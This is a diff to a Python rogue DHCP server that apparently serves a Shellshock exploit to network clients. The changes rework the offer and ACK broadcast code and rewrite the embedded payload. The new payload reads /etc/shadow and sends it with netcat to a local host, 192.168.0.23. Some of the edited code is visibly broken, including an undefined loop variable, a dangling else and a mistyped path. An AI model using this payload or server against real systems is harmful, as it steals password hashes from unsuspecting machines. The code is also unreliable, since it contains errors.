@@ -50,24 +50,32 @@ class Listener:
                 print(dhcpPacket.op)
                 time.sleep(2)
 
-
                 # Check for current transaction
-                if any(x.xid == dhcpPacket.xid for x in self.current_discovery):
-                    print('[+] Crafting ACK')
-                    ack = dhcpPacket.craft_ack()
-                    self.dhcp_socket.sendto(ack, ('255.255.255.255', 67))
-                    self.client_list.append(x)
-                    print(self.current_discovery)
-                    for each in self.current_discovery:
-                        if each.xid == dhcpPacket.xid:
-                            self.current_discovery.remove(each)
+                for eachPacket in self.current_discovery:
+                    if eachPacket.xid == dhcpPacket.xid:
+                        print('[+] Crafting ACK')
+                        ack = eachPacket.craft_ack()
+                        self.dhcp_socket.sendto(ack, ('255.255.255.255', 68))
+                        self.client_list.append(x)
+                        print(self.current_discovery)
+                        self.current_discovery.remove(each)
+
+                # if any(x.xid == dhcpPacket.xid for x in self.current_discovery):
+                #     print('[+] Crafting ACK')
+                #     ack = dhcpPacket.craft_ack()
+                #     self.dhcp_socket.sendto(ack, ('255.255.255.255', 68))
+                #     self.client_list.append(x)
+                #     print(self.current_discovery)
+                #     for each in self.current_discovery:
+                #         if each.xid == dhcpPacket.xid:
+                #             self.current_discovery.remove(each)
 
                 else:
                     print('[+] Crafting offer')
                     self.current_discovery.append(dhcpPacket)
                     offer = dhcpPacket.craft_offer()
                     print(offer)
-                    self.dhcp_socket.sendto(offer, ('255.255.255.255', 67))
+                    self.dhcp_socket.sendto(offer, ('255.255.255.255', 68))
 
 
 
@@ -78,7 +86,7 @@ class DhcpPacket:
     def __init__(self, dhcp_message):
         # print(dhcp_message)
         # print(len(dhcp_message))
-        self.exploit = b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow -c echo ls"  # % (self.ip, self.port)
+        self.exploit = b"() { :;}; /bin/cat /etc/shadow > /tmp/shadow; /bin/cat/ /etc/shadow | nc -u 192.168.0.23 67 "  # % (self.ip, self.port)
         self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
         # print(self.exploit)
         # print(len(self.exploit))
